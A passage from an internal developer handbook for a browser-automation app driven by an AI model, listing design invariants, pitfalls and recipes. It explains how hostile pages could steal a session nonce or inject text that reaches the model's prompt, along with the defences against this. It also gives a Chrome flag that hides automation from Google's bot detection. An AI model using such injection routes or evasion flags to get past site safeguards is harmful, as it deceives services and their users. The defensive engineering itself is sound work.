resumed run's `StepHealer` is constructed with `MAX_REPAIRS_PER_RUN` minus what
the ancestry already spent — the sum of `runs.repair_budget_spent`, not a count
of `run_repairs` rows — clamped at 0. At 0 the healer gives up on the first
failure of every step, which becomes a hold — so an over-resumed chain degrades
into "a human does every step" rather than failing, and the confirmation UI says
the remaining budget up front.

The 5 s margin is load-bearing: main must outlive the extension so the
extension's specific error wins the race, and the bridge's own timer fires only
when nothing is coming back at all.

## 8. Invariants — breaking one of these is a bug, not a refactor

- **`system_routines` rows are never written directly.** `updates/` is the
  truth; every sync deletes all rows and re-inserts.
- **User-routine validation lives in `UserRoutineStore.save`.** Its `unknown`
  parameter is the contract. Not in handlers, not in the renderer.
- **Only error _messages_ cross IPC.** Electron drops custom fields and prepends
  invoke plumbing, which the preload strips back off. Match on message text in
  the renderer, never on `code`.
- **One run at a time**, and `RunQueue` is what enforces it: `pump` dispatches
  only when nothing is `current`, and one target tab and one socket still stand
  behind it. `busy` in the orchestrator is now the *assertion* that the queue is
  correct — reaching `OrchestratorBusyError` is a queue bug, which is why
  `dispatch` counts it rather than swallowing it. Do not delete either.
- **A cancel that clears a hold announces it.** Both backends emit `'resumed'`
  when `cancel()`/`abortRun()` finds `paused` set, because the renderer's
  `HoldBanner` is cleared only by that broadcast — a silent clear leaves a
  banner offering Resume on a run that no longer exists.
- **Stop suspends the queue only when something is waiting behind the run.**
  `cancelRunning` arms `suspended` when the browser is paused, so the next entry
  does not drop into a browser the user just halted. It checks `waiting.length`
  because `suspended` is published to the renderer, which answers it with a
  "Queue suspended / Start queue" banner: with an empty line that button has
  nothing to dispatch, so stopping a held run left a dead control on screen and
  silently parked the *next* run the user started. Suspension with nothing to
  guard is the bug — do not drop the length check.
- **A parked run must be reachable by whoever parked it.** `cancel()` walks only
  the bridge's `pending` map and its waiters, so it cannot see a `waiting` entry
  or a `waiting-for-extension` entry holding a timer. Those are settled by
  `RunQueue.cancelEntry` / `clearWaiting` / `drain`, and `drain` runs from
  `before-quit` **before** the backend closes. A new park path needs its own
  reachable settle path; picking `cancel()` for one is how a promise never
  settles.
- **Three different things are called a hold, and only one of them retries.** A
  **scan hold** (`scanSensitive` saw a password/payment/one-time-code field)
  means the step never executed: `ExtensionSession.dispatch` waits on
  `waitWhileHeld` and retries the same step, up to `MAX_HELD_RETRIES`. That is
  the `held` ≠ failed rule — retry it, do not report it. At the cap `dispatch`
  throws a plain `Error`, which `isHealable` rejects, so the run ends
  `status: 'error'` — it does **not** fall through to a human hold.
  A **layer-3 hold** (`NeedsHumanError`) is the opposite: the step failed for
  good, a person does it by hand, and `runRoutine`'s catch deliberately
  **continues to the next step**. Do not "fix" that into a retry.
  A **hand-off** (`handOff` in `runChatGoal`) is the goal-run equivalent: no step
  failed, the page is simply one only a person can get past. It parks, then takes
  a fresh snapshot and decides again — so unlike layer 3 it does re-look at the
  same page, and unlike a scan hold it does not re-send the same step.
- **A run a human helped reports `assisted`, never `done`.** `done` means it
  needed nobody, and that distinction is the product's headline metric, so do
  not collapse the two. **All** kinds of hold emit `status: 'held'` and count
  toward `human_steps` — a scan hold did not have the person run the step, but
  it did require them to be there, which is what the metric asks. A scan hold
  counts **once per step**, not once per retry (`attempt === 0` in `dispatch`).
  `healing` is repair chatter only. One live consequence survives: a held
  `extract` never assigns `vars[step.into]`, so every later `{{into}}` silently
  resolves to `''` in a run that still completes.
- **A `held` row is cleared by the next non-terminal event of any kind.**
  `RunStore.record` marks `running` on anything non-terminal that is not itself
  `held`, `healing` included. Matching only `running` left a resolved hold on the
  row — reachable whenever a scan hold is followed by a repair — and the rail then
  asks for a human nobody is waiting on.
- **`opened_at` is stamped only on a deliberate open.** `RunStore.get` takes
  `markOpen`, and the renderer passes it from an explicit selection, never from
  the auto-follow refresh that fires on every progress event. Stamping every read
  made the thread-open metric report 100% by construction. The stamp runs before
  the row is read, so the returned `RunDetail` reflects it.
- **Recording a run must never fail the run.** The orchestrator wraps every
  observer call, and `runObserver` wraps every store write; both log once and
  carry on. Losing a thread is not allowed to lose a run. `learned` and
  `scored` go through the same two wrappers, so a site-memory write is exactly
  as disposable as any other event — it may be lost, the run may not.
- **Only main writes runs, once per event, before the broadcast.** The single
  writer is `runObserver` in `main/ipc.ts`, so two windows cannot double-write
  and the renderer never persists anything.
- **Only the user's Cancel raises `RunCancelledError`.** A dead socket, a closed
  tab and a new run taking the connection each unwind through `abortRun` with
  their own error, or a run that died on its own would be filed as one the
  Operator stopped deliberately.
- **A goal run never tries the same selector twice in a row.** `runChatGoal`
  remembers what failed since the last step that worked and refuses a repeat
  before it reaches the page, because the loop's only other recovery is a
  sentence in the history that the model is free to ignore — and it does. Any
  successful step, or a new URL, clears the set: on a single-page app the
  element it wanted may genuinely appear once something else has run.
- **A goal run that stops making progress ends.** `MAX_STATIC_LOOKS` identical
  consecutive pages makes `runChatGoal` throw. It compares the *page*, never the
  selector: the model rephrases a selector every time it retries the same
  control — one run spent 76 steps on five spellings of a single button — so no
  selector-based check can see the loop. `pageSignature` decides what "identical"
  means, and it is the **filtered DOM**, not the screenshot: a JPEG differs on a
  blinking caret, so keying on frame bytes let a run click one search box twenty
  times with the counter resetting every step. The frame is only the fallback for
  a page that cannot be read at all, and a snapshot with neither counts for
  nothing. UUID request ids are stripped from the DOM before it is compared: an
  error page that restamps one on every load is the same page, and without that
  the counter never fires on the one kind of page a run is most likely to be
  stuck on.
- **Every assistant turn in a goal run gets its `tool_result` before the next
  model call.** The thread is the loop's only memory, and an orphaned `tool_use`
  is a 400 no retry clears. `runChatGoal` tracks one `outstanding` id and
  discharges it at the single site that sends a turn, so no `continue` can skip
  it — do not move that push next to the individual outcomes, which is how the
  two hand-off paths came to be missed when this was first designed. The outcome
  a turn carries must say what *happened*, not what was chosen: `describeAttempt`
  returning the bare description is the bug this thread exists to fix.
- **A goal run parks on a wall rather than answering `done` to it.** A CAPTCHA,
  a bot check, a login or a paywall is not something a selector gets past, and
  the model's only other legal exits were a `done` on a goal it never reached or
  spending the step budget on the wall. Two paths reach the same `handOff`:
  `snapshot.blockedBy`, which parks **before** the model call so a recognised
  wall costs nothing, and the model's own `needs_human`, which covers the walls
  `WALL` does not know — vendor markers change, so the verb is the real net and
  the selector list is the optimisation. `MAX_HUMAN_HOLDS` bounds it: a wall
  nobody clears ends the run `error` instead of asking forever. A hand-off also
  clears `deadTargets`, `consecutiveFailures` and `staticLooks`, because the
  person just acted on the page. That last reset is what keeps
  `MAX_HUMAN_HOLDS` reachable: an uncleared wall leaves the page signature
  identical, so without it `MAX_STATIC_LOOKS` would end the run first, and on a
  hand-off it would report going in circles rather than that nobody answered.
- **`WALL` is page-blocking markers only.** It is spread into `SENSITIVE`, so a
  step dispatched onto a wall still holds as before, but only `WALL` is reported
  on a snapshot. Do not move the widget CAPTCHAs into it: a visible reCAPTCHA
  checkbox sits on pages whose next move is a button beside it, and parking
  every one of those before the model has looked would strand runs that were
  never blocked. The two text-matched entries are the same rule from the other
  side: a **terminal** block page carries no vendor widget at all, so
  `#cf-error-details:has-text("you have been blocked")` and
  `h2:has-text("Error 403 - Forbidden")` are the only things naming it. Both stay
  scoped — Cloudflare serves its origin-outage pages from that same element, and
  a bare `#cf-error-details` would park a run on a 521 that no hand-off can
  clear. `#challenge-running` is not a substitute for either: it matches only the
  interstitial that resolves on its own.
- **A part-dispatched input is never retried the other way.** `dispatchInput`
  separates `unavailable` (nothing reached the page, so `page-core.js` falls back
  to the synthetic path) from `failed` (some commands landed, so it throws).
  Collapsing the two types the text twice. The credential guard also has to stay
  *before* dispatch: CDP types at coordinates and cannot see what it is typing
  into, so `assertWritableTarget` is the only thing in the way of a password
  field. `select` stays on the DOM path — CDP cannot drive a native popup.
- **A timed-out step is indeterminate, not failed.** It may have run. Turning
  `StepIndeterminateError` into a retry has to answer for a double-submitted
  form. A resume inherits that ignorance: an indeterminate terminal error gives
  the plan **no default start index**, and `planResume` refuses until a person
  makes the two-way choice explicitly — the step did not run, or the step
  already ran — which is then recorded in `resume_start_index`.
- **A covered target is scrolled at, not given up on.** `waitForActionable`
  calls `scrollIntoView` on a rank-3 match and re-tests on the next poll,
  because a sticky header covers the middle of the *page*, never the middle of
  the *viewport*. What survives the scroll — a modal overlay, a consent banner —
  is a real refusal and still times out. Do not answer a covered match by
  dropping the occlusion check: clicking through a modal is the thing it exists
  to stop.
- **A no-op is a reason to look, never a reason to retry.** `changed: false`
  goes to the healer. A step marked `committing` skips the healer and goes to a
  human.
- **A resumed run is a new row, and its indexes are absolute.** `runRoutine`
  mints its own `runId` and the loop iterates the **full** `steps` array,
  `continue`-ing past every index below `resume.startIndex` — it never slices.
  Both halves are load-bearing. `run_steps` is keyed `(run_id, step_index)` with
  an upsert, so appending to the original run would overwrite the failed
  attempt's evidence — the `committing` verdicts and the indeterminate evidence
  the gates exist to read. And a re-indexed loop files `repair_proposals` rows
  at the wrong `step_index`, which `repairs:accept` then writes into the wrong
  step through `applyRepairs`, silently, because `isLikeForLike` checks only
  that the kinds match. The skip `continue` also lands **before** the per-step
  body's `startedAt`, `blankTelemetry()` and `setRunContext`, or a skipped index
  files a fabricated `run_steps` row and every telemetry metric double-counts.
- **A step that reported `committing` is never re-executed by a resume.** The
  verdict is persisted on `run_steps.committing` and gate 2 refuses outright —
  no override, no confirm dialog. Verdicts in the **skipped** range gate
  nothing, because those steps do not run again. Only `navigate` steps in the
  skipped range are replayed, because a URL load is idempotent in a way
  `click`/`type`/`select` are not, and the page's URL is then verified once
  before the first executed step.
- **A repair is per-run until a person says otherwise.** `applyRepairs` keeps
  only a single same-kind replacement, and `isLikeForLike` in `shared/routines.ts`
  is now that condition, extracted so the queue and the accept handler cannot
  drift from it. The write-back no longer happens on its own: `runObserver.repair`
  files a `repair_proposals` row as each repair is reported — **not** the
  `automationRun` handler, whose `RunResult.repairs` is success-path only and so
  would miss every repair on a run that held or failed, which is the case most
  worth reviewing — and only the `repairs:accept` handler writes a routine — refusing outright when `isLikeForLike` is false,
  because accepting a multi-step repair would bump the revision and store a
  byte-identical definition. Unreviewed means unchanged. A decided proposal is
  **marked, never deleted** — `decided_by` on `routine_versions` is an FK with
  `ON DELETE SET NULL`, so deleting the row would erase the link to the revision
  it caused, and PRD 09 needs the rejections too. **This bounds what
  survives into the stored routine; it does not bound what the run does** — a
  repair still executes in-run, and the repair prompt carries page content the
  page controls.
- **The credential guard is target-level.** `assertWritableTarget` refuses
  outright on the element a `type`/`select` actually resolved to.
  `scanSensitive` is a page-wide _hold_ heuristic with a deliberate one-step
  bypass (`skipScanOnce`) — never make it the thing that stops a password being
  typed, and never give the target check a bypass.
- **Control messages never take the serialization lock.** `pause`, `resume`,
  `stop`, `abandon` dispatch straight from the port listener, because a step can
  hold the lock for its whole timeout and Pause is what a user reaches for
  _while_ a step runs.
- **A failed `assert` ends the run, and never reaches the healer or a hold.**
  It is a verdict about the page, not an errand: a repair would ask the model to
  make a failing check pass, and a layer-3 hold resolves on Resume with the run
  then reporting success — the false success the kind exists to remove.
  `AssertionFailedError` deliberately does not extend `StepExecutionError`, which
  is the whole mechanism; `isHealable` needs no special case and must not grow one.
- **`assert` is exempt from the pre-dispatch sensitive scan, in both backends.**
  `runStep` in `background.js` and `scanHold` in `playwright-session.ts` each skip
  it. A checkout confirmation keeps the card form mounted, so scanning would park
  the run and report a sensitive field instead of the Author's verdict. It is a
  kind check, never a `skipScanOnce`-style flag, and it covers `assert` only —
  never `screenshot`, whose frame does reach the model. The target-level
  `assertWritableTarget` is untouched: an `assert` writes nothing.
- **A step kind that captures data must have a path into `RunResult`,** or it is
  a no-op with extra steps.
- **`EXTENSION_VERSION` and `extension/manifest.json`'s `version` must match.**
  The session handshake refuses a mismatch and a test asserts they agree.
- **`page-core.js` is the one in-page engine, and every guard change lands in
  both backends through it.** The extension loads it before `content.js`; the
  playwright backend bundles it via `?raw` and injects it per document. Never
  fork its logic into either transport — the whole point of the shared core is
  that `WALL`, `SENSITIVE`, `assertWritableTarget`, `observe` and the selector
  engine cannot drift between backends.
- **The view lock has exactly three releases: `paused`, `idle`, and Escape.**
  While `render` reports `active` the HUD swallows every trusted pointer, wheel,
  key and drag event on the top document, which is also how the agent's own
  input arrives — the only thing separating them is the window `agentIsDriving`
  holds open across `dispatch` plus `AGENT_INPUT_GRACE_MS`, because CDP acks an
  input command before the click it produced has finished dispatching. Narrow
  that window and the agent is locked out of every page it drives; drop the
  Escape release and a person whose app died mid-run is left with a browser they
  cannot use, since Escape unlocks locally first and only then asks the app to
  pause. The lock reaches the top document only: events inside a cross-origin
  iframe never reach the window listener, and covering them would need
  `pointer-events:none` on the frame, which would block the agent's own clicks
  into it as well.
- **The playwright backend's bindings are page-reachable, so they are gated,
  not trusted.** Init scripts run in the main world (the extension's isolated
  world is stronger — that hardening is future work, see §12), which means a
  hostile page can call `__oaInput`. `onInput` therefore honors a call only
  with the session nonce, only while a step is in flight, and only from the
  active page's main frame — a child frame's coordinates land in the wrong
  place under CDP anyway. Weakening any of those three gates hands trusted
  input to arbitrary pages. `onControl` (pause/resume from the banner) is gated
  the same way — only the active page's main frame may drive the run, because
  `resume` also clears the next step's sensitive-field scan.
- **The nonce travels page → main only, never main → page.** `HOOKS_CALL` calls
  `window.__oaHooks(method, arg)` with no key and checks the `__nonce` the answer
  carries; `callHooks` then throws `UntrustedPageError`. The old shape passed the
  nonce *in* as `__oaHooks(nonce)`, so a page that replaced that writable global
  — page scripts run after init scripts — harvested the key on the first call and
  could then forge `dom`, answer `scanSensitive` with `null`, report `exec`
  success, and call `__oaInput` for trusted input. Restoring an inbound nonce
  reopens all of it at once. Three things keep the channel honest and each is
  load-bearing: `adapterSource` installs `__oaHooks` **non-writable and
  non-configurable** so it cannot be wrapped; `agentSource` bails when a locked
  `__oaHooks` is already present and deletes any pre-existing `window.__oaCore`
  before `page-core.js` runs, because the adapter hands nonce-bound closures to
  whatever owns that global and page-core's own `if (window.__oaCore) return`
  guard would otherwise let a squatter keep it; and the nonce is per **session**,
  not per connect, because a locked property cannot be redefined for run two.
- **`UntrustedPageError` must stay fail-closed at every catch that reads the
  page.** `snapshot`, `scanHold` and `execute` each swallow ordinary hooks
  failures on purpose — an unreadable page is routine. Letting this error take
  those paths is not routine: a `domError` invites the model to keep working on a
  page that is attacking it, and a swallowed `scanHold` reads an impostor's
  silence as "no password field on this page". Each of the three rethrows it, and
  `isHealable` rejects it so no repair is asked to fix an impostor.
- **A finished run never closes the browser.** `disconnect()` detaches and
  nothing more — `browser.close()` over CDP only disconnects (see §9) — so
  Chrome stays up with its `automation-browser.json` endpoint intact, the page
  the run ended on stays on screen, and the next run adopts the same browser
  rather than launching a second one. That is also what keeps a session the user
  signed into by hand: the pre-login "open browser" flow and a run's own launch
  now end in the same state. Two consequences are deliberate. `disconnect()`
  clears `launched`/`endpoint`, so once a run is over `shutdownSync` leaves the
  browser alone and it outlives the app — the "Close browser" control is what
  closes it, and `announceBrowserStatus` in `main/ipc.ts` broadcasts the status
  on every terminal run event so that button is not still offering to open one.
  A quit *during* a run still kills a Chrome that run launched. The one browser
  something reaps on its own is a Chrome with no window left, which `adopt()`
  stops rather than returns (see §9) — there is no session on screen to keep,
  and the login lives in the profile on disk, not in the process.
- **A run never retargets to a tab it did not adopt.** When the active page
  closes mid-run, `PlaywrightSession` pops back only through `pageStack` (pages
  it adopted as popups), never to `context.pages().at(-1)` — falling back to
  whatever tab is last could hand the run the user's unrelated personal tab and
  act on it. Empty stack means `activePage` is null and the next step fails
  cleanly.
- **A run owns the browser exclusively.** `openBrowser`/`closeBrowser` (the
  pre-login control) throw while `this.browser` is set, and the "Open/Close
  browser" button is disabled whenever a run is active. Two Chrome launches on
  one profile fail with "Opening in existing browser session", so this guard is
  load-bearing, not cosmetic. `browserRunning` answers `true` from
  `this.browser` for the same reason and must keep doing so: probing instead
  would let a status query reap the Chrome a run is driving the moment its
  active tab closes.
- **A landmark is only ever shown on the origin it came from.**
  `SiteMemoryStore.forOrigin` scopes the SQL by `origin`, and `siteDigest`
  filters again by `row.origin === origin` before it renders a single line.
  Cross-origin rendering is how a hostile page's injection would reach a run
  on another site.
- **A landmark's actionable fields are model-proposed and harness-validated.**
  In a goal run `controlFact`'s selector and `routeFact`'s URL come from the
  model's own decision, so provenance is not the guard — validation is. What
  admits them: the selector resolved and the step changed the page, the route
  loaded and the next step on it worked, both are same-origin, and both clear
  `isActionableField` — no control character, at most
  `MAX_LANDMARK_FIELD_CHARS`. `assertFact` enforces that same pair at the store
  so neither caller can assume the other did it. Without the character rule a
  query key that percent-decodes to a newline breaks the digest line in two and
  forges harness framing in the one block `pruneThread` keeps. The label is
  separate: `sanitiseLabel` refuses a bare URL, a `{{` template marker, and
  text that echoes what was actually typed.
- **A committing step is never remembered.** `controlFact` refuses outright
  when `output.committing` is `true`. A hint is a nudge, and nothing may nudge
  toward placing an order.
- **A route earns its place from the next step, not from the load.**
  `createDepositor` holds a `navigate`'s route as `pendingRoute` and confirms
  it only once a later, successful step in `PAGE_EXERCISING_KINDS` runs —
  `CONTROL_KINDS` plus `extract` and `assert`. A `screenshot` or a `wait`
  confirms nothing, since neither shows the page is usable; a second `navigate`
  before that never confirms it, and a `navigate` that itself failed seeds
  nothing. A served error page is a successful load (§9), so the page has to
  turn out usable, not just reachable.

## 9. Traps

- **`--remote-debugging-port` alone brands the browser as automated.**
  `navigator.webdriver` is `true` with nothing but a profile and
  `--remote-debugging-port=0` — no `--enable-automation`, no Playwright, no CDP
  client attached; measured CDP-free on Chrome 151, and Google's sign-in answers
  it with `/v3/signin/rejected` "This browser or app may not be secure". That is
  why `ChromeProcess.launch` passes
  `--disable-blink-features=AutomationControlled`, which clears it; removing
  that flag breaks every Google login, including the manual one in the pre-login
  "open browser" flow, where no CDP client exists to blame. Curiously a fixed
  nonzero port does *not* set it — do not rely on that instead, the flag is the
  fix. `tests/playwright.verify.ts` asserts `navigator.webdriver === false`
  against real Chrome.
- **`launchPersistentContext` permanently brands the browser as automated.**
  `ignoreDefaultArgs: ['--enable-automation']` does not clear `webdriver` —
  measured on Chrome 151. That is why `ChromeProcess` spawns Chrome itself and
  `PlaywrightSession` attaches with `connectOverCDP`. Do not "simplify" the
  spawn away.
- **An init script runs before `<html>` exists, and the parser then replaces
  the initial document element.** Anything appended to `document.documentElement`
  at injection time either throws (it is null) or is silently discarded when
  the real element arrives. `buildHud`'s `mount()` re-attaches on
  `DOMContentLoaded` and on every `render` for exactly this reason; the first
  integration run against real Chrome died on it.
- **Chrome outlives its last window and keeps answering `/json/version`.** The
  process stays up with no window open, then drops the profile a few seconds
  later, and from then on every session it hands out dies on
  `Browser.setDownloadBehavior` — "Browser context management is not
  supported". A pid-plus-`/json/version` liveness check cannot see that, so
  `adopt()` requires a `page` target in `/json/list` and stops a browser that
  has none, and `launch()` waits for the first `page` target so a status check
  right after opening cannot reap the browser it just started.
- **`connectOverCDP`'s `browser.close()` only disconnects.** The Chrome
  process keeps running; `ChromeProcess.stop` (SIGTERM, then SIGKILL) is what
  actually closes a launched browser, and only `closeBrowser` and
  `shutdownSync` call it.
- **A page carried over from the last run keeps working, bindings included.**
  Its `__oaHooks` is still locked from the previous connection, so
  `agentSource` bails and the core instance in that page is the old one — but
  the binding closure it captured re-arms against the *new* connection, because
  Playwright re-installs the page-side stub for `__oaInput`/`__oaControl` on
  connect. Measured on Chrome 151 and asserted in `tests/playwright.verify.ts`:
  trusted input on a second run over a page the first run left behind still
  comes back `via: 'cdp'`. Do not "fix" the bail, and do not answer this by
  looking the binding up at call time instead of capturing it — a page that
  replaced the global would then be handed the session nonce (§8).
- **Chrome picks its own DevTools port and reports it through
  `DevToolsActivePort` in the profile dir.** `launch()` removes the stale file
  before spawning — polling an old one would adopt a dead port. A second
  launch against a live profile fails with "Opening in existing browser
  session", which is why `adopt()` always runs first.
- **`scanSensitive` runs in the top frame only, on both backends.** A login
  form inside an iframe does not park the run; the credential guard
  (`assertWritableTarget`) still refuses per-element wherever the step lands.
- **The first progress event is what creates the run, so a goal run emits one at
  `stepIndex: -1` the moment `connect()` returns.** Everything downstream hangs
  off it: `RunStore.record` writes the row, `runsChanged` broadcasts, and
  `liveRunId` — hence `busy` and the disabled composer — is set. Without it the
  window is inert for the whole of connect + snapshot + one model call, measured
  at 4–6 s with the model round trip alone a median 4.2 s. Two things about it
  are load-bearing. It fires **after** `connect()`, so a Chrome that never
  launches still opens no run. And its index is **-1**, because `threadRows`
  takes the first description it sees for an index as that row's title and
  demotes the rest to notes — at index 0 the placeholder would permanently
  outrank the step's own description. Any other non-step event needs the same
  treatment.
- **A goal run leaves nothing behind about *why* it chose what it chose.** The
  run tables record the step and its description, never the page the model read,
  the token counts, or whether the loop counters moved — three separate bugs took
  a rebuild to diagnose for want of them. Set `AUTOMATION_DEBUG=1` and each goal
  run writes `userData/runs/<runId>/trace.jsonl`: one line per step with the URL,
  the page fingerprint `pageSignature` compared, `staticLooks`, the thread's size
  after pruning, the model's stop reason and token usage, whether a thinking
  block came back, the decision, and the outcome. `AUTOMATION_DEBUG=dom` also
  writes `dom-NN.html` per step, which is how you tell a page that flickers from
  one that is genuinely still. It is a development aid: it costs a file write per
  step and it records typed text and page content, so leave it off otherwise.
  The exposure starts at `1`, not at `dom`: `debugRecord` gates only on the runs
  directory, so `trace.jsonl` already carries the goal and every decision's
  `text` — the literal string typed into the page. `dom` adds the page itself.
- **A served error page is a successful page load.** `navigate` resolves, the DOM
  reads, `domError` stays `null`, so no counter, no status and no snapshot field
  sees a failure — only the model can notice, from the page text. **Do not try to
  detect it by DOM size.** That was tried and measured: `order-done.html` (223
  filtered chars) and `subscribed.html` (244), the two fixtures where `done` is
  the *correct* answer, are both smaller than a real "Sorry, A Problem Occurred"
  page (338). No threshold separates them, so any size rule silently tells the
  model its success page is broken. `G05-served-error-page` covers the scenario.

- **The Vercel gateway appears to ignore `anthropic-beta` headers.** A nonsense
  beta value returns 200 and `context_management` behaves identically with and
  without its header, so server-side context editing and compaction are both
  unavailable. `pruneThread` is client-side for that reason — and pruning an
  image invalidates the messages cache, so pruning and caching cannot both be
  had.
- **`pnpm --filter autonomous-browsing test:db` cannot be replaced by `vitest` or `node`.** `postinstall`
  rebuilds better-sqlite3 against Electron's ABI, so plain Node cannot load it.
  The script esbuild-bundles `tests/db.verify.ts` into `.cache/` (outside
  electron-builder's `out/**` glob) and runs it under `ELECTRON_RUN_AS_NODE=1`.
- **A `CHECK` constraint cannot be `ALTER`ed.** `runs.status`, `runs.source`,
  `run_artifacts.kind` and `site_landmarks.kind` are closed sets, so widening
  one — PRD 03's `repair` artifact kind, PRD 13's `debug` source, a fourth
  landmark kind — means a table rebuild in its own migration, not an `ALTER`.
  `site_landmarks.step_kind` deliberately carries no `CHECK`: it mirrors the
  open-ended `ActionStep` union, so it is validated at the store boundary
  instead, against `STEP_KINDS` in `site-landmarks.ts`.
- **`site_landmarks` keys on a dedicated `fact_key`, not `(selector, url)`.**
  An obstacle has neither — only a blocking marker. An `ifnull`-style key over
  `selector`/`url` would coalesce every wall on one origin to the same
  null-ish value and collapse them into a single row. `controlFact`,
  `routeFact` and `obstacleFact` each set `factKey` inline instead — the
  selector for a control, the blanked URL for a route, the marker itself for
  an obstacle.
- **Rebuilding `runs` silently erases every run chain.** `rerun_of` and
  `resumed_from_run_id` are self-referencing FKs with `ON DELETE SET NULL`, so
  with `foreign_keys` ON the `DROP TABLE runs` in the standard
  create/insert-select/drop/rename rebuild fires that action against every row
  still pointing at the old table — even though the rebuild copies each row
  straight back. `chainRepairsUsed` then reports only the run's own spend, so an
  over-resumed chain gets a full repair budget again, and `chainCommitting` stops
  seeing ancestor verdicts, so gate 2 stops refusing steps a page reported as
  committing. Carry both links across a scratch table, exactly as the
  `repair_proposals` migration had to for `routine_versions.decided_by`.
- **`cloneNode` copies attributes; a page keeps field state in properties.** The
  snapshot clone therefore loses everything typed — `input.value`,
  `textarea.value`, `checked`, `selected` — and the model reads every field it
  has filled as still empty. `mirrorLiveState` in `page-core.js` writes the live
  state across after the children are appended (textarea's value must overwrite
  its cloned text node). It deliberately skips `SENSITIVE_TARGET`: a password the
  human typed in the browser must never reach the model, and the browser is
  exactly where the product asks them to type it.
- **An artifact's row lands before its file does.** `RunStore.addArtifact` inserts
  synchronously and drains the JPEG through a serialized promise chain, because a
  run must not wait on disk. So `artifactData` returns `null` for a frame whose
  write has not landed; `flushWrites()` is the join, and tests must await it. The
  chain re-checks the run still exists before writing, or deleting a live run
  would recreate the directory `RunStore.remove` had just taken away.
- **A stored screenshot cannot be referenced by path.** `img-src` is
  `'self' data:`, so `runs:artifact` reads the file and returns a data URL, one
  artifact at a time. Deleting a run deletes its directory too — `RunStore.remove`
  does both, and orphaning one is the easy mistake.
- **`TokenOptimizer` imports Electron's `nativeImage` lazily** so the DOM half
  stays loadable under plain Node for vitest. Do not hoist that import.
- **The db path is injected, never derived from Electron's `app`,** for the same
  reason. Keep it a parameter.
- **`automation:status` is both an `invoke` channel and a push channel.** That
  is deliberate — `handle` and `on` are separate registries.
- **Nothing broadcasts `sites:changed` on a deposit, only on forget and
  purge.** `useSites` therefore also subscribes to `runs:changed`, which fires
  when a run opens and again when it reaches a terminal status — enough to
  pick up whatever a finished run deposited. Drop that second subscription and
  the Site memory pane freezes at whatever it showed when the window opened.
- **`system.watch` debounces 250 ms** because editors emit several events per
  write and a half-written file parses as garbage. The sync also wraps inserts
  per row: it runs from an `fs.watch` callback, where an escaping throw is an
  uncaught exception rather than an error the UI can show.
- **The packaged CSP is pinned to `'self'`.** The dev HMR websocket allowance is
  injected at serve time by a Vite plugin in `electron.vite.config.ts` — never
  add it to the HTML. It is why the renderer's fonts are self-hosted woff2 under
  `src/renderer/src/assets/fonts` and why nothing may compile a template at
  runtime: there is no `unsafe-eval` and no CDN.
- **electron-builder skips code signing silently, and an unsigned mac bundle is
  reported as "damaged", not as "unidentified developer".** With no certificate
  in the keychain it warns, signs nothing, and exits 0 — there is no ad-hoc
  fallback — so the `.app` has no `Contents/_CodeSignature` at all and macOS
  refuses it outright, with no "Open Anyway". Every artifact built before
  2026-09-09 is like this. `mac.forceCodeSigning`/`win.forceCodeSigning` now
  turn that into a build failure, `build/entitlements.mac.plist` is what makes
  the hardened runtime survivable (V8 and the `better-sqlite3` `.node` both
  need it), and `entitlementsInherit` has to name the same file because
  auto-discovery covers only the app, not the helpers. Notarization is likewise
  a silent skip: it runs only when `APPLE_API_KEY`/`APPLE_API_KEY_ID`/
  `APPLE_API_ISSUER` (or the `APPLE_ID` trio) are exported. `syspolicy_check
  distribution <app>` names every remaining blocker in one pass.
- **The UI says "automation"; the code says "routine".** One concept, two
  vocabularies, deliberately: the schema, the IPC channels and every type use
  `routine`, and every user-visible string says `automation`. Do not rename
  either side to match the other.
- **Chrome runs native hosts with a minimal `PATH`,** so a `#!/usr/bin/env node`
  shebang cannot find an nvm or Homebrew Node. That is why the installer
  generates `relay-shim.sh` pinning the interpreter.
- **`capture()` requires the target tab to be the active tab in its window,**
  and throws otherwise — and that is not its only failure. A backgrounded window
  also fails the compositor read with `Failed to capture tab: image readback
  failed`, which is not a permission or activation error and cannot be prevented
  from this side. Run `68712c80` lost 10 of 13 frames to it and decided almost
  every step from the DOM alone, so treat an imageless goal run as the normal
  case rather than a broken one. The reason travels as `PageSnapshot.screenshotError` and
  a goal run stores it as an imageless `screenshot` artifact, so a thread with no
  pictures says why rather than looking broken. A goal run also stores only a
  *changed* frame: an unrepainted window returns the same JPEG every step. The
  frame is stored before the `done` and `needs_human` branches, so the page an
  answer was actually read off is on record and not just the steps leading to it. Every `screenshot` step and every DOM snapshot fails
  once the user switches tabs, which makes it the likeliest real-world step
  failure and the constraint any background-run design has to start from.
- **The service worker stays alive on a `chrome.alarms` keepalive**
  (`'host-keepalive'`, every 30 s) plus `onStartup`/`onInstalled` reconnects.
  Without it the native port dies with the idle worker after ~30 s. That is the
  only reason the `alarms` permission exists.
- **Trusted input costs an infobar and loses to DevTools.** Attaching
  `chrome.debugger` puts Chrome's unhideable *"…started debugging this browser"*
  bar over the window, and its Cancel button detaches mid-run; a tab with
  DevTools open refuses the attach outright. Both fall back rather than fail, so
  `via` in `trace.jsonl` is the only place that difference shows. `insertText`
  also appends unless something is selected — hence `selectAll` before a `type`.
- **Extension changes need a full browser quit,** not just a window close.
- **This shell is zsh**: quote glob patterns in commands (`--include='*.ts'`).

## 10. Task recipes

**Adding a step kind** touches seven places, and only `describeStep` is a
compiler error — the rest fail silently:
`shared/types.ts` (union) → `shared/routines.ts` (`STEP_FIELDS` plus any
cross-field rule, `describeStep`, and `resolveStep` if it carries user text) →
`orchestrator.ts` (a path into `RunResult` if it produces anything) →
`extension-session.ts` (`stepTimeout`, which `playwright-session.ts` imports, so
one edit covers both) → `page-core.js`'s `ACTIONS` (both backends run it) →
`session.ts` if the kind needs its own error class → and, for the extension's
Node-side kinds, `background.js`. Bump `EXTENSION_VERSION` and the manifest
together. The engine is shared, so most kinds are one `ACTIONS` entry.

**A kind whose failure the backends must classify is two edits, not one.** The
throw sites in `ExtensionSession.runStep` and `PlaywrightSession.runStep` are
separate, and so are the two pre-dispatch scans. Landing one leaves the default
backend broken with nothing failing to compile or test.

**Adding an IPC channel**: `shared/ipc.ts` → a `handle(...)` in `main/ipc.ts`
(shape-check the payload there, validate deeply in the store) → a method on
`api` in `preload/index.ts` → the renderer. Push channels get an
`on…Changed(listener): () => void` unsubscriber, matching the existing nine
(the newest is `sites:changed`, nested as `api.sites.onChanged`).

**Adding a renderer surface** is one variant and one component. `View` in
[renderer/lib/view.ts](src/renderer/src/lib/view.ts) is a discriminated union and
`useView` holds one of them; `App.tsx` switches the third column on `view.kind`,
